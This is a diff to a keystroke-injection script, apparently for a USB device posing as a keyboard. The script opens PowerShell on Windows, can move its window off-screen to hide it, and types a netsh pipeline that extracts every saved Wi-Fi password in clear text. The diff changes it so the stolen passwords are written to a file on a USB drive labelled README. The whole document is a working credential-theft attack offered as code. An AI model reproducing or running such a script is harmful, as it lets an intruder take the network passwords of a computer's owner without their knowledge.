@@ -1,5 +1,5 @@
 function fast() { //sets typing speed as fast as possible with no randomness 
-  typingSpeed(0,0)
+  	typingSpeed(0,0)
 }
 function startPS() { //starts powershell (if fails on slower computers extend the delays and see if that helps)
 	press("GUI x");
@@ -16,10 +16,13 @@ function hidePS() { //moves powershell window far outside of screeen coords but 
   	press("ENTER");
 }
 function scrapeWiFi() { //scrapes wifi passwords
-	type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'test' } | select name\n") //gets usb path based on device name
-	type('(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize ')
+	type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name") //gets usb path based on device name
+  	press("ENTER");
+  	type("cd $usbPath.name")
 	press("ENTER");
-	delay(200);
+  	type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> test.txt')
+	press("ENTER");
+  	delay(500);
 }
 function exitPS() { //exits Powershell
 	type("exit")
@@ -30,5 +33,5 @@ layout('us');
 fast();
 startPS();
 //hidePS();
-scrapeWiFi()();
+scrapeWiFi();
 exitPS();
